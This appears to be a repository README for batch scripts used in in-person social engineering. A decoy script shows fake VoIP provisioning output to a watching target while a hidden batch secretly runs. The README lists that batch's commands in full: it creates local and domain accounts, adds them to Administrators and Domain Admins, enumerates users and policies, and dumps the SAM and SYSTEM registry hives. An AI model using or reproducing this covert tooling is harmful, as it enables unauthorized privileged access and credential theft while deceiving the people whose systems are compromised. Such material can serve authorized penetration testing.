# soc-eng-batches
Batch files to show dummy activity while gathering system info and trying to create users. Useful during social engineering, if a target will let you use their system, but watches you do so.

# Setup
These batches are intended to be put on a flash drive.
* Place **run.bat** on your flash drive.
  - This batch displays the dummy information and creates the dummy log, while calling the malicious batch and directing its output.
  - This was written for the social engineering pretext of being a VoIP technician. Feel free to customize the ECHO messages and dummy commands to match your cover story.
* In the same directory level as **run.bat**, create the directories **drivers** and **logs**.
* Place **framework.cmd** in the **drivers** directory.
  - This is the malicious batch, which is called by run.bat.
  - See the variables **strLOCALUSER**, **strDOMUSER**, and **strMYPASS**. These values will be used when the malicious batch attempts to create local and domain user accounts.

# Usage
* Follow the setup instructions to load the batches onto your flash drive.
* Once you've convinced the target to let you use their computer, run *run.bat*.
  - Try to run it with elevated privileges, as some steps like exporting SAM and SYSTEM files will require them.

### What the target sees over your shoulder:
* A command prompt displays *"Provisioning VOIP SIP client..."*.
* After a few moments, the prompt displays "*Ready for connectivity test. Press any key to continue...*".
* A dummy log file will open, while a traceroute (`tracert -d -w 99 8.8.8.8`) shows in the command prompt.
  - This dummy log was created as **logs/[computername]-log.txt**.
  - This dummy log contains the output of `route print` and `tracert -d -w 99 8.8.8.8`, while ran in between the "Provisioning" and "Ready" messages.
  - The dummy log file can be useful for killing time while waiting for the batch to finish, which should normally only take a few moments.
* The prompt will close a few moments after the displayed traceroute finishes.

### What happens in the background:
* After the displayed traceroute is finished, **run.bat** called **drivers/framework.cmd**, while directing all of its ouput to **drivers/[computername]-log.txt**.
* **framework.cmd** does the following:
  - Echo the date and time
  - Get the username with `whoami`
  - Get password and account lockout settings with `net accounts`
  - Try to create a local user account (`net user /add [username] [password]`)
  - Try to add that local user to the local Administrators group (`net localgroup /add administrators [username]`)
  - Get a list of local users (`net user`)
  - Get a list of local admins (`net localgroup administrators`)
  - Try to create a domain user accounts (`net user /add [username] [password] /domain`)
  - Try to add that domain user to the Domain Admins group (`net group /add "domain admins" [username] /domain`)
  - Get a list of domain users (`net user /domain`)
  - Get a list of domain admins (`net group "domain admins" /domain`)
  - Get Group Policy settings (`gpresults /z`)
    - This sometimes takes a few moments.
  - Get routing information (`route print`)
  - Get services information (`net start`)
  - Attempt to get SAM and SYSTEM files
    - `reg save hklm\system [frameworkpath]/[computername]-system.dat`
    - `reg save hklm\sam [frameworkpath]/[computername]-sam.dat`
